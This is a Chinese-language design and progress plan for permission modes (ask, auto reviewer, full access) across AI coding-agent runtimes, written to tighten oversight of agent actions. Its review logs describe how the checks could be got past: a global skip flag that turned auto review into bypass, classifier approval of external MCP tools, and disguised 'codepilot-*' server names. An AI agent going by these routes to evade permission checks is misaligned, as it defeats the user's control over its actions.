# 跨 Runtime 权限模式：按规则询问 / 替我审批 / 完全访问

> UI ownership（2026-08-25）：本计划继续是三 Runtime reviewer/bypass wire 的权威；Composer 的四档展示、`mode + permission_profile` 双向映射、legacy ask no-touch 与单一入口由 [composer-model-route-permission-consolidation.md](composer-model-route-permission-consolidation.md) 负责。两者不得各写一套 resolver。

> 创建时间：2026-07-17
> 最后更新：2026-07-20
> 状态：🚧 Claude capability route 可读取 Agent SDK 0.2.111；Codex auto reviewer 已完成 Runtime 分流、保守版本门、thread start/resume 回显校验与运行时降级，定向回归通过。真实 Claude/Codex approve/deny/MCP smoke 仍待完成；Native Phase 3 仍明确不支持。
> 风险等级：Tier 2（权限边界 / Runtime）
> 事实基线：[外部事实手册](../../external-facts.md)

## 用户问题与争议

当前会话权限选择只有“默认”和“完全访问”。用户希望 Codex 与 Claude Code 都能提供上游已经支持的 auto——由 Runtime 替用户逐项审批，而不是关闭所有权限检查；并要求评估 AI SDK Native 是否能同步。

关键取舍：**替我审批是 reviewer，完全访问是 bypass，两者不能共享实现或文案。** Claude/Codex 有上游原语；AI SDK Native 没有现成的 session-level auto reviewer，必须 POC 后再宣称支持。

## 状态

| Phase | 内容 | 状态 | 用户能看到什么 |
|---|---|---|---|
| Phase 0 | 统一权限语义与事件合同 | ✅ 已完成（复审轮 #4 闭合外部 MCP 洞；#5 去前缀豁免 + 日志脱敏） | 三个选项的风险和行为清晰、不互相冒充；「替我审批」承诺的拦截范围与真实出货边界一致；伪装 `codepilot-*` 名称无法绕过能力门；权限审计日志不含命令/路径/URL 原文 |
| Phase 1 | Claude Code auto | ✅ bundle-safe 版本解析 + compiled-route Playwright smoke 通过；settingSources × provider 复核仍转 Phase 4 | 会话可选“替我审批”（**配了外部 MCP 时该档不可用并说明真实原因**）；模型代审拒绝在 UI 按来源显示 |
| Phase 2 | Codex auto | ✅ 当前 0.145 schema 接线、版本门和响应回显闭合；每次 thread/start/resume/turn 显式携带 reviewer/approval/sandbox | 支持版本使用 Codex auto reviewer；旧版/未知/回显不符时显式降级，不冒充完全访问 |
| Phase 3 | Native AI SDK POC/实现 | 📋 待开始（**前置约束（复审轮 #6）：POC 落地前 Native 会话不显示 `auto_review`；存量/切档/直接 PATCH 到达 Native 时降级为只读 `explore`（拒写/拒 Bash），不再静默落 `NORMAL_RULES`**） | 支持则提供同义选项；不支持则诚实标记 |
| Phase 4 | 继承、Bridge、后台任务与回归 | 📋 待开始 | 前台/后台/远程路径不绕过用户选择 |

## 2026-07-19 用户 smoke 打回：新增修复清单

### 取舍与根因

- **Claude Code 不是 SDK 版本真的过低。** `package.json` 与已安装包均为 `@anthropic-ai/claude-agent-sdk@0.2.111`，CLI 为 2.1.212；实际 capability route 却返回 `installedVersion=null`。`sdk-capability.ts` 依赖 `createRequire(__filename)` 从当前文件向上找 package manifest，直接 Node 执行可用，但 Next/Turbopack bundle 中 `__filename` 已指向 `.next` chunk，故生产路由读不到依赖版本。现有单测只直接 import helper，没有覆盖编译后的 route。
- **Codex 不是上游不支持。** 用户 smoke 当时的 CodePilot runtime 没有传 reviewer 字段，并把 Codex auto 错误地受制于 Claude SDK 探测；本机 Codex 0.145.0-alpha.18 schema 已证明 thread/start、resume、turn 都有 reviewer / approval policy 入口。现已按 Runtime 分流并接线。
- **三档权限继续保持两轴分离。** `auto_review` = `approvalPolicy: on-request` + `approvalsReviewer: auto_review` + workspace sandbox；`full_access` = `approvalPolicy: never` + danger-full-access。两者不得共用布尔开关。

### 执行清单

- [x] 用 app cwd/package root 作为 build/package-safe 版本事实源替换 `__filename` 向上搜索；dev/Turbopack compiled route 已实测，packaged 结构按 standalone cwd 合同解析。
- [x] 增加 compiled route-contract smoke：安装 0.2.111 时不再返回 `sdk_version`；纯版本函数继续覆盖低版本/缺失的 fail-closed 语义。
- [x] 建立 Codex permission wire resolver，并在 `thread/start`、`thread/resume`、`turn/start` 消费；每 turn 重申策略，避免切档后立即发送或 resume 沿用旧策略。当前 schema 没有另需调用的 thread settings mutation。
- [x] 以 app-server 版本与响应回显决定 Codex 选项/运行时是否可用：最低已验证版本保守钉为 `0.145.0-alpha.18`；未知/旧版在发送 thread 参数前降级，缺少或不一致的 start/resume 回显再次降级并发 canonical `unavailable`；全程不写用户全局 `~/.codex/config.toml`。
- [ ] 补 Codex command/file/MCP approval 的 approve/deny/timeout/unavailable 行为测试和真实登录 smoke；恢复 DNS 后再做外部 reviewer live 验证。

## Phase 0：语义合同

推荐 canonical profile（UI 文案不直接复用存储枚举）：

- `default` / **请求批准**：安全操作直接执行，有风险的操作先征求用户同意。
- `auto_review` / **替我审批**：把本来需要用户确认的请求交给受限 reviewer；仍受 workspace/sandbox 约束，拒绝、超时或 reviewer 不可用均 fail closed。
- `full_access`：跳过确认；危险选项，保留二次确认和醒目状态。

执行前必须复核当前 `default -> acceptEdits` 的实际语义；如果默认已自动接受写文件，UI 的“按确认规则执行”不能继续含糊。

### 执行清单

- [x] 扩展共享类型、API validation、session create/update、task inheritance、worktree derive、bridge 和 UI union；同时收紧 `src/types/index.ts:735` 处宽松的 `permission_profile?: string` 声明。
      共享 union 落在 `src/lib/permission/profile.ts`（`PERMISSION_PROFILES` / `isPermissionProfile` / `normalizePermissionProfile`）；`CreateSessionRequest.permission_profile` 由 `string` 收紧为 union；POST /api/chat/sessions 此前**完全没有** validation，本轮补上 400。
- [x] 定义 canonical runtime event：review requested / approved / denied / unavailable / timeout，含 reviewer source breadcrumb。
      `src/lib/permission/review-event.ts`（5 态 + `sdk-reviewer|user|rule-engine`）+ `review-audit.ts` sink。**本轮未加 DB 列**：source breadcrumb 走事件流 + 脱敏日志，持久化留作决策（见决策日志 2026-07-17 ③）。
      复审轮 #2 补：`sdk-reviewer` 不再是「有类型无生产者」——`denied` 由 SDK `PermissionDenied` hook 产出（`buildSdkReviewerDenial`），`unavailable` 由 route 降级分支产出。**`sdk-reviewer` 的 `approved` / `requested` / `timeout` 上游无回调，本 Runtime 永远不会产出**（证据见决策日志 2026-07-17 复审轮 #2 ②），不是漏接线。
- [x] Plan mode 始终优先，不因 auto_review/full_access 获得执行能力。
      `resolveClaudeWireOptions` 单点判定，plan 分支在 profile 与 globalSkip 之前；表驱动测试 3 profile × plan/code 全覆盖。
- [x] AskUserQuestion、credential、外部发布/付费/高影响操作列为不可由 generic reviewer 自动批准的 human-only 类别。
      `HumanOnlyCategory` 5 类；显式表 + credential 名字标记 + `mutationLevel === 'mutating_external'` 派生。server（canUseTool）、bridge（broker + autoApprovePendingForSession）、client（PermissionPrompt）三处共用同一分类。
      **复审轮 #2 修正（P1）**：上一轮声称「canUseTool 拦截 human-only」是错的——`permissionMode:'auto'` 下 SDK classifier 批准即 `{behavior:'allow'}`，根本不调 canUseTool。真实前置拦截改为 **deny rule**（`resolveHumanOnlyDenyTools` → `disallowedTools`），已核对 cli.js 确认 deny rule 在 classifier 之前。代价：auto_review 档下 `generate_image` / `cli_tools_*` / `notify` **不可用**（而非「转人工」）；`AskUserQuestion` 由 SDK 自带 `requiresUserInteraction` 保护，不进 deny 表。
      **复审轮 #3 修正（P1）**：deny 表由**手写 6 个 FQN** 改为**在全量 in-process 工具宇宙上派生**（`CODEPILOT_MCP_TOOL_SERVERS` × `getHumanOnlyCategory`）。上一轮显式表与派生规则「恰好一致」是巧合而非构造——凭据名标记 / `mutating_external` 派生出的 human-only 工具（如未来的 `codepilot_rotate_api_key`）过去只在 reviewer **之后**的 canUseTool 被拦，classifier 可先行放行。现新增 drift 测试 introspect 真实 MCP server 实例，工具漏登记即失败。
      **复审轮 #4 修正（P1，外部 MCP 洞已闭合）**：上一轮把「外部 MCP 工具可能被 classifier 先行放行」当作已知边界转 Phase 4，同时 UI 文案却承诺「凭据/付费/发布会被直接拦截」——两者不能同时成立，等于用文案掩盖权限洞。现改为**能力门 fail-closed**：`external-mcp.ts` 在 shipping query 前统一检测显式 `mcpServers` 与 user/project/local settingSources 可引入的外部 MCP；**检测到任一外部 MCP、或检测/解析失败、或调用方压根没探测**，一律拒绝 `'auto'` 并降级为 `'default'`（更多询问），发 canonical `unavailable`。因此 `'auto'` 真正出货时，in-process 宇宙**就是**全部 MCP 宇宙，`resolveHumanOnlyDenyTools` 的枚举从「部分答案」变成「完整答案」。`<cwd>/.mcp.json` 无条件扫描（DB provider 走 `settingSources:['user']` 却仍手工回注它，只信 settingSources 会漏）。反例测试覆盖 external credential / 付费 / 发布 / 未知工具四类均绝不进入 reviewer allow。
- [x] 权限选择变化只影响后续请求；in-flight prompt 的处理规则必须明确并测试。
      规则：**只有** `→ full_access` 这一次刻意升级会 resolve 在途 prompt（用户就是冲着眼前这条点的），且 human-only 行仍留给用户；`→/← auto_review` 一律不 resolve 在途 prompt。
      **复审轮 #3**：改为**行为级测试**——真实 PATCH route handler + 真实 `registerPendingPermission` registry，断言 4 种转换下在途 promise 的真实结局（`→ full_access` = `allow` 为正向对照，证明其余 3 条 null 断言不是空洞的）。

## Phase 1：Claude Code

- [x] 将 `auto_review` 映射到 Agent SDK `permissionMode: 'auto'`，不设置 dangerous bypass flag。
      `route.ts` 与 bridge `conversation-engine.ts` 都改为调用 `resolveClaudeWireOptions`，不再各自解释 profile。
      **复审轮 #2 修正（P1）**：旧全局 `dangerously_skip_permissions` 之前排在 auto_review 之前，且 `claude-client.ts` 又重算一次 globalSkip 覆盖 wire 值 → auto_review + 全局 skip 实际塌成 bypass。现 resolver 内 auto_review 排在 globalSkip **之前**，`resolveEffectiveSkipPermissions` 成为二者唯一交汇点：`auto` / `plan` 恒不 skip；globalSkip 只能放宽 `default`。
- [x] 先审计并收窄 bare `allowedTools`：mutating MCP / notification / CLI / dashboard 不能在 classifier 前被整组自动批准。
      bare allowlist 由 8 个 server 收窄到 3 个只读 server（memory / widget / widget-guidelines）；canUseTool 内那份**已漂移**的手写 `autoApprovedTools`（放行了 `codepilot_cli_tools_add/remove` 与 `codepilot_generate_image`）删除，改为 `isHostAutoApproved` 派生。heartbeat 分支与 disallowedTools 未回归（测试钉住）。
- [x] SDK 不支持/版本过低时禁用选项并解释，不静默回落为 full access 或 acceptEdits。
      `sdk-capability.ts` 读实际安装版本；新会话选项 disabled 且显示原因（i18n en/zh）；降级方向是 `'default'`（更多询问），**不是** acceptEdits；服务端降级发 canonical `unavailable` 事件。
      **复审轮 #3 补齐（P1）**：**已持久化为 auto_review 的旧会话**在不支持的 SDK 上，chip 不再显示「替我审批」——改为显示**真实生效档**（请求批准），并在下拉里用 `permission.autoReviewDegraded`（en/zh）说明「保存的是替我审批，当前 SDK 无法执行」。探测未返回时不预判降级。
      **复审轮 #4 修正（P2，placeholder 反假数据）**：探测状态由 `capability | null` 改为三态 `checking | failed | ready`——旧写法把「还没问」和「问了但失败」都塌成 `null`，于是用 `minVersion ?? '—'` 渲染出「需要 SDK —（当前：—）」，fetch 失败后该占位**永久保留**，等于用编造的版本声明冒充「我不知道」。现新增 `auto-review-display.ts` 单点决策，组件只渲染它给的 notice key（组件已看不到版本号，无法自己编）：checking / probe-failed / 低版本 / 版本读不出 / 外部 MCP / MCP 配置读不出 六条路径各有真实文案（en/zh），并有 `permission-external-mcp.test.ts` 断言任一状态都不产出 `—` 占位。
- [x] 把 SDK reviewer 决策映射到 canonical audit event；UI 能区分“模型代审拒绝”和“用户拒绝”。
      rule-engine / user 两条来源已接线并测试；`sdk-reviewer` 的 **denied** 经 SDK `PermissionDenied` hook 落为 canonical event + `permission_review` SSE（该 hook 仅在 classifier 拒绝时触发，故来源精确，不靠形状猜）；`unavailable` 由 route 降级分支产出。
      **复审轮 #3 补齐（P1）**：`permission_review` SSE 现有真实 UI 消费链——`useSSEStream`（含 state/source 守卫，未知值丢弃不猜）→ `stream-session-manager.reviewNotices`（`buildSnapshot` 透传，否则下个事件即被覆盖）→ `PermissionReviewNotices` 组件按 `reviewerSource` 选文案。`deniedByReviewer` / `deniedByUser` 不再是死键，新增 `deniedByRules`。
      **产品承诺按真实可证范围降级**：classifier **批准**上游无 hook/回调 ⇒ 本 Runtime 永远产不出 `sdk-reviewer` 的 approved，UI 只呈现拒绝类。`autoReviewWarning` 文案同步改写：付费/发布/凭据类工具在此档**被直接拦截**，不再承诺「仍然由你决定」（那会许诺一个永远不会出现的弹窗）。
- [ ] 复核 DB provider、env provider、resume、headless task、heartbeat 的 settingSources 和权限继承。
      部分：已做 headless task / worktree derive / bridge 继承（fail-closed，不升级）与 heartbeat 收窄回归（该回归测试本轮改为**行为级**：直接跑 `buildClaudePermissionQueryOptions`，含「普通轮不禁 Bash」正向对照）；settingSources × provider 形态复核未做，留 Phase 4。

## Phase 2：Codex

- [x] 从当前 app-server 生成 schema 确认 wire 字段与 enum：本机 0.145.0-alpha.18 为 `approvalsReviewer`，值含 `auto_review`；将该已验证 build 作为保守最低门槛，未知和更旧 binary fail closed。该门槛是“最低已验证版本”，不是对上游首次引入版本的猜测。
- [x] 每个 `turn/start` 显式传 `approvalPolicy + approvalsReviewer + sandboxPolicy`；`thread/start/resume` 同源设置初始默认，解决切档后立即发送和 stale resume。
- [x] `auto_review` 使用 on-request + auto reviewer + workspaceWrite；`full_access` 同时使用 never + dangerFullAccess，绝不共用开关；Plan 永远 readOnly。
- [x] 未调用任何写用户全局 `~/.codex/config.toml` 的接口；全部是当前 thread/turn 请求参数。
- [x] thread start/resume 携带一致配置；每个新 turn 再显式发送当前 profile，切档不依赖旧 thread snapshot。
- [ ] 现有 command/file approval、permissions request、MCP elicitation 都纳入矩阵；未知类型 fail closed。
- [x] 修正 `item/permissions/requestApproval` response 合同：以 CodePilot 实际使用的 app-server 生成 TypeScript schema为依据，批准返回原请求 permission subset + `turn/session` scope，拒绝返回空 permissions；不再错误复用 `{ decision }`。定向 contract 已覆盖 allow once / allow session / deny / 非升级，真实登录审批 smoke 仍记在 Ledger 待跑。
- [x] UI/API capability 读取当前选中 Codex binary 版本；运行时再检查同一能力，并要求 thread start/resume 回显 `auto_review`。旧版、未知版本、缺失回显、回显 user 四种反例均不保留 auto reviewer。
- [x] 产品裁决：CodePilot 的会话权限选择是 thread/turn 权威事实源。default 显式发送 `on-request + user + workspace-write`，不继承用户全局 Codex config；这可能增加询问，但方向更保守且保证 UI 所选与实际 wire 一致。

## Phase 3：AI SDK Native

### POC 问题

- AI SDK 的两种审批入口——agent 级 `toolApproval` 与工具级 `needsApproval`——各自能否无损接入现有 permission registry、暂停/恢复与 HMAC/nonce 防重放？POC 需评估两种入口后选定 Native 接入点。
- reviewer 使用哪个模型、哪些输入、是否允许工具、如何限制成本/延迟？
- reviewer prompt 如何抵抗 tool name/input 中的提示词注入？
- 如何保证未知工具、解析失败、timeout、provider failure 全部拒绝？

### 实施门槛

- [ ] reviewer 仅看到结构化、最小化的 permission facts，不读取 secrets、完整对话或工具输出。
- [ ] deny-by-default，固定输出 schema，禁 tools/MCP/network，短 timeout，per-session 有界并发。
- [ ] 高风险类别 human-only；规则层明确 auto-safe 的读操作无需浪费 reviewer 调用。
- [ ] 若 POC 不满足安全/延迟门槛，Native 明确显示“不支持替我审批”，保留 default/full_access。

## Phase 4：验证与 Guardrail

- [ ] 单测 profile validation、DB roundtrip、session/worktree/task inheritance、profile 切换。
- [ ] Runtime contract：Claude/Codex/Native 对 approve/deny/timeout/unavailable 的 canonical event 一致。
- [ ] 表驱动断言 3 Runtime × 3 profile × plan/code 的具体 wire options，禁止只测 UI label。
- [ ] 反例：auto reviewer 不得批准 credential、付费、发布、删除/越界写、未知 permission kind。
- [ ] 反例：full_access 不能改变 Plan mode；auto_review 不能设置 bypass flag。
- [ ] 反例：Claude auto 下 mutating MCP 不在 bare allowlist；Codex reviewer 变化不保留 stale thread snapshot。
- [ ] Bridge/IM 与后台任务不得因没有前台 UI 而自动升级到 full_access。
- [x] **外部 MCP 能力门已闭合**（复审轮 #4 落地、#5 去前缀豁免）：任何显式 `mcpServers` / user·project·local 配置来源出现的 server 一律视为 external（不再按 `codepilot-` 名称前缀豁免——外部配置键由用户命名，`codepilot-vault` 伪装即可绕过），只要探测到外部 MCP 可能加载，该会话就不进入 `auto` 档、fail-closed 回落 `default` 并显式告知（`auto_review_external_mcp`）。因此凭据形 / 高影响外部工具在 auto_review 下**不会**被 classifier 先行放行。connect-time tool-list hook（拿到清单后按 `getHumanOnlyCategory` 追加 deny，让含外部 MCP 的会话也能用 auto_review）为**恢复可用性的后续优化**，不是安全前置——安全边界已由能力门保证，不再需要「用户应改用 default」的临时提示。
- [ ] `npm run test` + 三 Runtime 真实 smoke；权限相关日志做脱敏审查。
- [x] 更新 permission guardrail / handover，记录 source breadcrumb、版本门槛、响应回显与 default 覆盖语义。

## 验收标准

- 用户能准确预测三个权限选项；“替我审批”任何路径都不是 blanket allow。
- Claude/Codex reviewer 的每次批准或拒绝可审计、可区分来源。
- Runtime 不支持时显式说明，不做跨模式静默降级。
- reviewer 错误、timeout、未知类型全部 fail closed。
- profile 在新会话、既有会话、resume、task、worktree、Bridge 路径一致。

## Smoke Ledger

| Date | Runtime | Provider | Model | 凭据形态 | 场景 | Result | Evidence |
|---|---|---|---|---|---|---|---|
| _待跑_ | claude_code | Anthropic/env | current supported | login/key | auto approve + auto deny + human-only | 📋 | |
| _待跑_ | codex_runtime | Codex Account | current supported | login | auto reviewer + command/file/MCP | 📋 | |
| _待跑_ | codepilot_runtime | same-session provider | supported | key | POC fail-closed matrix | 📋 | |
| _待跑_ | bridge / 后台 task | any | any | any | 无前台 UI 路径不自动升级权限（Phase 4 反例） | 📋 | |
| _待跑_ | claude_code | Anthropic/env | current supported | login/key | **auto_review live reviewer**：批准 / 拒绝 / timeout 各出一条 canonical event 且 `reviewerSource='sdk-reviewer'` | 📋 移交用户统一验证 | Phase 1 无凭据环境只能测到 wire options 拼装层；SDK reviewer 的真实判定行为未验证 |
| _待跑_ | claude_code | Anthropic/env | current supported | login/key | **复审轮 #2 deny-rule 前置性**：auto_review 下调用 `codepilot_generate_image` / `codepilot_notify` 必须被 SDK 直接拒绝，且**不产生任何计费/外发副作用**；同一工具在 default 档仍能正常弹窗使用 | 📋 移交用户统一验证 | 前置性来自读 cli.js classifier 源码，非测试证明；无凭据环境无法执行 SDK 权限路径 |
| _待跑_ | claude_code | Anthropic/env | current supported | login/key | **复审轮 #2 sdk-reviewer denied 事件**：classifier 拒绝一次后，`PermissionDenied` hook 必须触发并产出 `reviewerSource='sdk-reviewer'` 的 `permission_review` SSE（用户点 Deny 则不得触发） | 📋 移交用户统一验证 | hook 触发条件来自 cli.js 静态证据 |
| _待跑_ | claude_code | Anthropic/env | current supported | login/key | **复审轮 #3 reviewer 拒绝的 UI 可见性**：auto_review 下被 classifier 拒绝一次，聊天区应出现「模型代审拒绝 + 工具名」通知（`PermissionReviewNotices`）；用户自己点 Deny 不得出现该通知 | 📋 移交用户统一验证 | 单测覆盖到守卫与事件合同层；SSE→snapshot→组件的端到端渲染未在真实流里跑过 |
| _待跑_ | claude_code | any | any | any | **复审轮 #3 旧会话降级显示**：把会话存为 auto_review 后换用低于 0.2.111 的 SDK，chip 应显示「请求批准」且下拉给出降级说明，而不是继续显示「替我审批」 | 📋 移交用户统一验证 | 需要真实降级 SDK 环境，无法在本仓库单测构造 |
| _待跑_ | claude_code | any | any | any | **a05 收窄 UX 回归**：mutating MCP（cli-tools / media / image-gen / dashboard / notify）移出 bare allowlist 后，日常使用是否出现预期外的新权限弹窗 | 📋 移交用户统一验证 | 单测只能证明它们进入权限判定路径，不能证明弹窗频率可接受 |
| _待跑_ | claude_code | any | any | any | **复审轮 #4 外部 MCP 能力门（可用性回归）**：配置任一外部 MCP server 后，「替我审批」应变灰并给出外部 MCP 原因；全部停用后该档应恢复可选 | 📋 移交用户统一验证 | 单测用临时目录构造配置文件；真实用户的 `~/.claude.json` 形态多样，需确认门不会因常见配置**永久**关死该档（可用性风险见决策日志 #4 ②） |
| _待跑_ | claude_code | any | any | any | **复审轮 #4 能力探测四态文案**：断网/接口 500 时下拉应显示「无法确认…」而非「需要 SDK —（当前：—）」；探测中显示「正在检测…」 | 📋 移交用户统一验证 | 单测覆盖 resolver 全部状态与 i18n 完整性；真实 fetch 失败时序未在浏览器里跑过 |
| 2026-07-19 | claude_code | any | any | 本机安装 0.2.111 | 打开权限选择并读取 capability route | ❌ 选项错误禁用，Phase 1 重新打开 | route 返回 `supported=false`、`reason=sdk_version`、`installedVersion=null`；直接 Node 可解析 0.2.111，差异指向 Next bundle 路径 |
| 2026-07-19 | codex schema probe | Codex Account | any | 本机 0.145.0-alpha.18 | 生成 app-server JSON schema，核对 auto reviewer wire | ✅ 上游能力存在；当日产品尚未接入 | `ApprovalsReviewer` 含 `auto_review`；历史失败证据保留，不代表 2026-07-20 当前实现 |
| 2026-07-20 | codex_runtime | local contract | any | 旧版/当前版/响应 stub | Runtime 分流、SemVer prerelease 门、start/resume 回显、旧版运行时降级 | ✅ 346/346 定向回归通过 | Codex 不再依赖 Claude SDK；版本与回显双门 fail closed。真实 approve/deny/MCP 仍待 live smoke |
| 2026-07-20 | codex_runtime UI | Codex Account | gpt-5.6-sol | 本机 0.145.0-alpha.18 + 当前登录 | capability route → 权限菜单 → 风险确认 → 切换 | ✅ UI passed | route 返回 `profiles=[default,auto_review,full_access]`、版本与 reviewer echo source；界面二次确认后 chip 显示「替我审批」。尚未冒充 command/file/MCP approve/deny/timeout live matrix |

## 决策日志

- 2026-07-20（Claude P1 修复）：Codex auto capability 从 Claude SDK 探测中拆开；chat route 与 Bridge 均按 effective Runtime 取能力。版本门只负责预防旧 binary 收到未知字段，thread response 回显是最终 feature fact；任一失败均降级到 user reviewer，并发 canonical unavailable。
- 2026-07-20（Codex default 裁决）：接受 CodePilot 显式覆盖用户全局 Codex permission/sandbox 默认。原因是会话 UI 必须成为可预测真源；覆盖方向为更保守的 on-request + workspace sandbox，不静默扩大权限。作为可感知行为写入 guardrail，后续 release notes 必须披露。
- 2026-07-19（用户 smoke 打回）：Claude Phase 1 从完成改为重新打开；根因是 capability route 的 bundle-fragile 版本发现，不是用户 SDK 过低。修复门禁必须穿过编译后的 route，helper-only unit 不足以关闭。
- 2026-07-19（Codex schema 裁决）：当前 app-server 已提供 auto reviewer 原语，Phase 2 不再是“先确认是否支持”，而是接入现有能力；仍须保留旧 binary/未知 schema 的 fail-closed 门。
- 2026-07-17：确认 Claude Agent SDK 0.2.111 类型已包含 `permissionMode: 'auto'`；列为直接适配，不复刻 reviewer。
- 2026-07-17：确认 AI SDK 7 tool approval 不是 session-level auto reviewer；Native 必须先 POC，不能为了 UI 对齐把 tool approval disabled 当 auto。
- 2026-07-17：采用三档 canonical profile；Plan mode 和 human-only 操作保持更高优先级。
- 2026-07-17：Codex 采用 per-turn 权限两轴 + thread 初始默认；reviewer per-thread config 必须 live probe，不写用户全局 config。
- 2026-07-17：Claude 接 auto 前先收窄 bare `allowedTools`，否则 classifier 会被绕过。
- 2026-07-17（Phase 0 + Phase 1 实施，commit `55c062b`）：三档 union 全链落地 + Claude auto 接线。验证：`npm run test` = typecheck 干净 + **4087 tests / 4087 pass / 0 fail**（上轮基线 4019，本轮 +68）。要点与取舍：
  1. **`default → acceptEdits` 语义复核结论（本轮不改行为，只记录）**：现状 `default` 档实际下发 `acceptEdits`，即**文件写入自动接受、不询问**，只有 Bash / 网络等才走 canUseTool。这与旧文案“按确认规则执行”给用户的印象（“有风险就会问我”）**不一致**——用户很可能以为编辑文件会被问。本轮采取的是**文案对齐而非行为对齐**：`permission.defaultDesc` 改为“安全操作直接执行，有风险的先问你”，仍未明说写文件属于“安全操作”。**建议 Codex 裁决**：是否把 `default` 改为 SDK `'default'`（写文件也问）并把 `acceptEdits` 作为独立第四档，或至少把文案写死为“文件编辑直接执行”。改行为属于「改默认权限策略」，是 assignment 明令禁止自行扩的 scope，故留裁决。
  2. **a05 收窄的真实代价**：`allowedTools` 是 SDK 边界的自动批准，命中即**不进 canUseTool**。旧的 8-server bare allowlist 意味着整组绕过 classifier / human-only / reviewer——含 shell-exec 的 `codepilot_cli_tools_install`。收窄后 mutating server 进入 canUseTool，其中安全子集由**按工具（非按 server）**的 `HOST_AUTO_APPROVED_TOOLS` 保持免弹窗；`generate_image`（付费）、`cli_tools_add/remove`（shell）、`notify`（外发）**从此会弹窗**——这是本轮刻意的 UX 变化，需 Smoke 确认可接受。
  3. **reviewer source 未落 DB（待裁决）**：`permission_requests` 无法表达“谁决定的”，要真正可审计需加 `decided_by` 列。加列属 DB schema 改动，本轮硬规则禁止自行扩 scope，故 breadcrumb 暂只走事件流 + 脱敏日志。**建议 Codex 裁决**是否批准这一 additive 迁移。
  4. **测试抓到一个真 bug**：`sdk-capability` 首版用 `require('@anthropic-ai/claude-agent-sdk/package.json')` 读版本，但该 SDK 未在 `exports` 暴露 package.json → 每次抛错 → 能力门永远返回 unsupported → auto_review 会被**永久静默禁用**。「门不能空洞为假」的正向断言当场抓到；改为 `createRequire` 解析入口后向上找 manifest。
- 2026-07-17（复审轮 #2 修复，commit `59d8623`）：Codex 复审 5 条（3×P1 + 1×P1 测试形状 + 1×P2）。验证：typecheck 干净 + **4105 tests / 4105 pass / 0 fail**（上轮基线 4087，本轮 +18）。逐条：
  1. **P1 全局 skip 塌陷（已修）**：`auto_review` × 旧全局 `dangerously_skip_permissions` 实际走 bypass —— resolver 把 globalSkip 排在 auto_review 之前，`claude-client.ts` 又重算一次 globalSkip 覆盖了 wire 值。上轮测试只覆盖 `globalSkip=false`，所以对最危险的组合全绿。现 auto_review / plan 对该开关 fail-closed，`resolveEffectiveSkipPermissions` 是二者唯一交汇点；已补 auto_review×globalSkip、plan×globalSkip×3 profile、以及「globalSkip 仍可放宽 default」的正向断言（防止把开关改成空洞的无效开关）。
  2. **P1 human-only 无前置拦截（已修，含 scope 变更）**：读 `node_modules/@anthropic-ai/claude-agent-sdk/cli.js`（0.2.111）的 classifier 本体确认——auto 模式的判定顺序是 ① deny rule → 立即 deny（且 auto 分支只在 `'ask'` 时进入）② `requiresUserInteraction()` → ask ③ 非 `classifierApprovable` 的 safetyCheck → ask ④ **其余交给模型 classifier，批准直接返回 `{behavior:'allow'}`，不弹 prompt**。而 `canUseTool` 就是那个 prompt ⇒ **上轮「canUseTool 拦截 human-only」的说法是错的**。`PermissionRequest` hook 同样无用（只在 classifier 之后的 `shouldAvoidPermissionPrompts` 分支派发）。故 deny rule 是 SDK 唯一提供的前置拦截：auto_review 档下 `generate_image`（付费）/ `cli_tools_*`（shell）/ `notify`（外发）走 `disallowedTools`，**从「转人工」降级为「不可用」**——这是本轮刻意的语义取舍，文案已同步改为「会被拦截，不交给模型」。`AskUserQuestion` 经确认自带 `requiresUserInteraction(){return!0}`，由 SDK 保证转人工，不进 deny 表（denied 会直接废掉模型提问能力）。
  3. **P1 sdk-reviewer 事件无生产者（部分修）**：同一份 cli.js 证据显示 `PermissionDenied` hook 的派发点被 `decisionReason.type==='classifier' && classifier==='auto-mode'` 包着 ⇒ **它只在模型代审拒绝时触发，用户点 Deny 不会触发**，来源精确。已接为 `sdk-reviewer` 的 canonical `denied` + `permission_review` SSE；route 降级分支产出 `unavailable`。**但 classifier 的「批准」上游没有任何 hook/回调 ⇒ `sdk-reviewer` 的 approved/requested/timeout 本 Runtime 永远产不出**，这是上游限制，不是漏接线——已写进 Phase 0 清单，避免下一个人当 bug 追。**遗留**：`permission_review` SSE 无 UI 消费点，`deniedByReviewer`/`deniedByUser` 仍是死键 ⇒「可审计」已达成，「用户可见」未达成，Phase 1 对应两项回退为 `[ ]`。
  4. **P1 测试形状（未修，认领为债）**：a01 的 400、a05 的 canUseTool、a09 的 in-flight 仍是 source-shape / 纯函数断言，没有真正执行 route handler 或 permission callback。本轮新增测试同样停在 resolver/事件层——**它们证明的是「wire options 与事件合同正确」，不是「SDK 真的照做」**。诚实结论：deny-rule 前置性由读 cli.js 得到，不由测试得到。
  5. **P2 文案（已修）**：`permission.defaultDesc` 改为「文件编辑直接执行；命令等有风险的操作先问你」——不再隐瞒 acceptEdits 会自动写文件；`autoReviewDesc` 由「仍需人工」改为「会被拦截，不交给模型」以匹配 ②的真实行为。旧会话降级的 UI 展示未做（见 Phase 1 清单）。
- 2026-07-17（复审轮 #3 修复，commit `eb18a5b`）：Codex 复审 4 条（3×P1 + 1×P2）。验证：typecheck 干净 + **4120 tests / 4120 pass / 0 fail**（上轮基线 4105，本轮 +15）。逐条：
  1. **P1 human-only 前置边界只覆盖显式 6 个名字（已修）**：`getHumanOnlyCategory` 按三条规则分类（显式表 / 凭据名标记 / `mutating_external`），但 reviewer 前的 `resolveHumanOnlyDenyTools` 只返回手写的 6 个 FQN——两张表**恰好一致是巧合，不是构造**。现改为在 `CODEPILOT_MCP_TOOL_SERVERS`（全量 in-process 工具宇宙）上派生，任何一条规则判定 human-only 的工具都会进 deny 表；新增 drift 测试 introspect 真实 MCP server 实例（`instance._registeredTools`），工具漏登记即失败。凭据形工具的反例在**真实 wire 边界**断言（注入 universe → `buildClaudePermissionQueryOptions` 的 `disallowedTools`），未知工具经 `decideHostToolPermission` 证明落 `ask`。**诚实边界**：外部 MCP 的工具清单在 connect 时才有，无法在 options 组装时枚举 ⇒ 外部凭据形工具仍可能被 classifier 放行，已写进 Phase 4 + 代码注释，不假装闭合。
